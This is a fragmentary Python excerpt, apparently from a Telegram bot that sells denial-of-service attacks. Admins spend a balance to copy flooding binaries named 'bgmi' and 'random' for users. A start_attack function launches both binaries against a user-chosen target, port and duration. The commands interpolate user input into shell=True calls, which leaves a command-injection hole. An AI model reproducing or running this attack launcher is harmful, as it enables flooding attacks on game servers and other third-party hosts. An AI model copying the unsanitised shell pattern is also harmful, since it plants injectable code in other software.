...
ORIGINAL_RANDOM_PATH = '/workspaces/Dark/bgmi2' 
...
USER_COOLDOWN = 0  # Cooldown time sirf normal users ke liye
    ...
    if str(message.chat.id) in ADMIN_IDS:
        ...
        if len(args) == 3:
            ...
            if admin_balances[str(message.chat.id)] >= cost:
                ...
                user_random_path = f'random{user_id}'
                shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
                shutil.copy(ORIGINAL_RANDOM_PATH, user_random_path)
...
def start_attack(user_id, target, port, duration):
    ...
    try:
        ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 35", shell=True)
        time.sleep(5)
        subprocess.run(f"./{random_file} {target} {port} {duration} 35", shell=True)
